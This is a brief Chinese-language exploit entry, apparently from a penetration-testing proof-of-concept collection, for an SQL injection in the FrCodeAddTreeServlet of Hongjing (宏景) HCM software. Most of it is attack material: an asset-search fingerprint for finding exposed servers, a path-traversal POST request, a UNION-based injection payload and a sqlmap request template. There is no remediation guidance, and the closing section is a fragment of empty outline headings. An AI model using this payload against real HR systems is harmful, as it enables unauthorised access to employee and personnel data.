# 宏景人力资源信息管理系统FrCodeAddTreeServlet存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1`
- **关键头**：`Content-Length: 157`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1' UNION ALL SELECT 111*111,NULL,NULL,NULL,NULL,NULL-- fNwL&treetype=&orgtype=

sqlmap
POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
Host:
Content-Length: 157
Content-Type: application/x-www-form-urlencoded
params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1&treetype=&orgtype=

\[宏景-ehr-hcm-frcodeaddtreeservlet-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 宏景人力资源信息管理系统FrCodeAddTreeServlet存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统